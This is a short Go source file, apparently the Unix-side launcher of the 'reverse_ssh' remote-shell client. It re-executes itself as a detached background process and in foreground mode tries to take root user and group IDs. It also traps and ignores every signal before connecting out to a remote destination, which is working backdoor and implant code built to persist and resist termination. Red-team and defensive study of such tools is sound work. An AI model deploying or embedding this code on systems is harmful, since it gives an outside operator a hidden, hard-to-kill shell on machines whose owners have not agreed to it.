//go:build !windows
// +build !windows

package main

import (
	"log"
	"os"
	"os/exec"
	"os/signal"
	"syscall"

	"github.com/NHAS/reverse_ssh/internal/client"
)

func runOrFork(destination, fingerprint, proxyaddress string, fg, dt, rc bool) {
	if fg {

		path, err := os.Executable()
		if err != nil {
			syscall.Setuid(0)
			syscall.Setgid(0)
		} else {
			var i syscall.Stat_t
			err := syscall.Stat(path, &i)
			if err != nil {
				syscall.Setuid(0)
				syscall.Setgid(0)
			} else {
				syscall.Setuid(int(i.Uid))
				syscall.Setgid(int(i.Gid))
			}
		}

		// Set up channel on which to send signal notifications.
		// We must use a buffered channel or risk missing the signal
		// if we're not ready to receive when the signal is sent.
		c := make(chan os.Signal, 1)

		// Passing no signals to Notify means that
		// all signals will be sent to the channel.
		signal.Notify(c)

		// Block until any signal is received.
		go func() {
			for range c {
				// Ignore all signals. Because yes
			}
		}()

		client.Run(destination, fingerprint, proxyaddress, rc)
		return
	}

	cmd := exec.Command(os.Args[0], append([]string{"--foreground"}, os.Args[1:]...)...)
	cmd.Start()
	cmd.Process.Release()
	log.Println("Forking")
}
